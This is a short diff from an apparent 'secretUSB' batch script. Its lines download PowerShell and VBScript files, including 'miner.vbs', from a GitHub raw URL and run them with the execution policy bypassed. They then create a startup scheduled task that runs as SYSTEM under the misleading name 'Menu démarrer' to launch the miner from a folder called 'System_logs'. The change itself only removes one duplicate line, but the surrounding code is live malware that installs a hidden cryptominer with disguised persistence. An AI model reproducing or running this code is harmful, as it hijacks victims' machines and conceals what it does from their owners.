@@ -90,7 +90,6 @@ curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/raccourci.ps1
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/miner.vbs
 
 powershell.exe -ExecutionPolicy Bypass -File raccourci.ps1
-powershell.exe -ExecutionPolicy Bypass -File dowload.ps1
 
 start powershell.exe -ExecutionPolicy Bypass -File dowload.ps1
 schtasks /create /tn "Menu démarrer" /tr "%USERPROFILE%\AppData\Roaming\System_logs\miner.vbs" /sc onstart /ru System
